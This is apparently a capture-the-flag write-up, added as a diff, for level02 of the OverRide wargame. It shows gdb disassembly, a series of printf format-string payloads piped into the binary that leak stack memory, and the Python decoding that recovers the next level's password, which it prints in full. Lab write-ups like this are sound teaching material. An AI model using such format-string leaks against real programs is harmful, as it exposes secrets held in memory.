@@ -1,0 +1,65 @@
+we have program level02
+it prompt for a login
+after watching at gdb dissasembly of main
+we can see a printf call that is vulnerable to format string injection
+
+   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
+
+
+and the program use fopen on the .pass file in level03 home folder
+
+so the content will be loaded in the stack
+
+with the printf exploit we can dump the stack and see it in clear hex
+
+the exploit will be 
+
+$ python -c 'print("llx "+"\n"+"BBB")' | ./level02
+
+and it print the stack, the exploit works
+
+we need to find the password ...
+
+so we try 
+$ python -c 'print("%1$llx "+"\n"+"BBB")' | ./level02 
+$ python -c 'print("%2$llx "+"\n"+"BBB")' | ./level02 
+$ python -c 'print("%3$llx "+"\n"+"BBB")' | ./level02 
+$ python -c 'print("%4$llx "+"\n"+"BBB")' | ./level02 
+$ python -c 'print("%5$llx "+"\n"+"BBB")' | ./level02 
+....
+
+our password is located at 22 to 27
+
+level02@OverRide:~$ python -c 'print("%22$llx "+"\n"+"BBB")' | ./level02 | grep access!
+756e505234376848  does not have access!
+level02@OverRide:~$ python -c 'print("%23$llx "+"\n"+"BBB")' | ./level02 | grep access!
+45414a3561733951  does not have access!
+level02@OverRide:~$ python -c 'print("%24$llx "+"\n"+"BBB")' | ./level02 | grep access!
+377a7143574e6758  does not have access!
+level02@OverRide:~$ python -c 'print("%25$llx "+"\n"+"BBB")' | ./level02 | grep access!
+354a35686e475873  does not have access!
+level02@OverRide:~$ python -c 'print("%26$llx "+"\n"+"BBB")' | ./level02 | grep access!
+48336750664b394d  does not have access!
+level02@OverRide:~$ python -c 'print("%27$llx "+"\n"+"BBB")' | ./level02 | grep access!
+0  does not have access!
+
+
+so as it's little endian we have to reverse it and decode it
+
+level02@OverRide:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:33:41)
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> "756e505234376848".decode("hex")[::-1]
+'Hh74RPnu'
+>>> "45414a3561733951".decode("hex")[::-1]
+'Q9sa5JAE'
+>>> "377a7143574e6758".decode("hex")[::-1]
+'XgNWCqz7'
+>>> "354a35686e475873".decode("hex")[::-1]
+'sXGnh5J5'
+>>> "48336750664b394d".decode("hex")[::-1]
+'M9KfPg3H'
+
+
+so the pasword is : "Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"
